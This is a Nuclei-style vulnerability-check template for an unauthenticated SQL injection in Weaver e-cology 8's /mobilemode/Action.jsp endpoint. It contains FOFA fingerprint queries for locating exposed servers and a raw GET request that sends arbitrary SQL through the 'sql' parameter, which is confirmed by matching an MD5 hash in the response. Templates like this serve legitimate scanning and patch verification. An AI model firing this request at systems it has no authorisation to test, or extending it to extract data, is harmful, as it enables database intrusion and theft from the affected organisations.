id: weaver-e-cology-sql-injection

info:
  name: "泛微 E-cology Action.jsp 接口 SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: header="testBanCookie"||banner="testBanCookie"||body="/wui/common/css/w7OVFont.css"||(body="typeof poppedWindow"&&body="client/jquery.client_wev8.js")||body="/theme/ecology8/jquery/js/zDialog_wev8.js"||body="ecology8/lang/weaver_lang_7_wev8.js"
          上海泛微网络科技股份有限公司开发的泛微 e-cology 8系统中，/mobilemode/Action.jsp接口的sql参数未实施充分的输入验证，导致攻击者可通过构造恶意SQL语句实现数据库信息泄露及服务权限提升。
  tags: 泛微 E-cology

http:
- raw:
  - |
    GET /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.mec.servlet.MECAdminAction&action=getDatasBySQL&datasource=&sql=select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456'))&noLogin=1 HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '0xe10adc3949'
